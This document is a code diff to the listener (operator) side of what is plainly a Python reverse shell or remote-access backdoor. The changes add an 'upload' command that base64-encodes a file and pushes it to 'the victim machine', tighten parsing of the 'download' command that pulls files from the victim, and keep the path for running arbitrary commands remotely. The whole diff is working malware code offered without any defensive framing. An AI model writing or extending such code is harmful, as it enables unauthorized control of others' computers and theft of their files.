@@ -28,6 +28,9 @@ class Listener:
         '''
         serialize data and send over TCP socket.
         '''
+        if type(data) == bytes:
+            data = str(data, encoding='utf-8')
+
         json_data = json.dumps(data)
         bytes_json_data = bytes(json_data, encoding='utf-8')
         # print('Listener sent: ',bytes_json_data)
@@ -69,6 +72,16 @@ class Listener:
             return (f'[*] File {path} Downloaded successfully.')
 
 
+    def read_file(self, path):
+        '''
+		upload file contents to the victim's machine.
+		'''
+        with open(path, 'rb') as file:
+            file_content = file.read()
+            base64_file_content = base64.b64encode(file_content)
+            return base64_file_content
+
+
     def run(self):
         '''
         start listener.
@@ -79,7 +92,7 @@ class Listener:
 
                 # create list and get commands with args
                 command_lst = command.split(' ')
-                command_list_len = len(command_lst)==2
+                command_list_len = len(command_lst)>=2
                 cmd = command_lst[0]
                 if command_list_len:
                     path = command_lst[1]
@@ -89,10 +102,20 @@ class Listener:
                     self.connection.close()
                     sys.exit()
 
-                elif cmd == 'download':
+                elif cmd == 'download' and command_list_len:
                     contents = self.execute_remotely(command)
                     execution_result = self.write_file(path, contents)
+
+                elif cmd == 'upload' and command_list_len:
+                    print('[*] Listener : Uploading file to the victim machine.')
+                    str_file_contents = str(self.read_file(path), encoding='utf-8')
+                    command +=  ' ' + str_file_contents
+                    # self.serial_send(command)
+                    execution_result = self.execute_remotely(command)
+
+                    
                 else :
+                    # print('[-] Listener else')
                     execution_result = self.execute_remotely(command)
                 
                 print(execution_result)
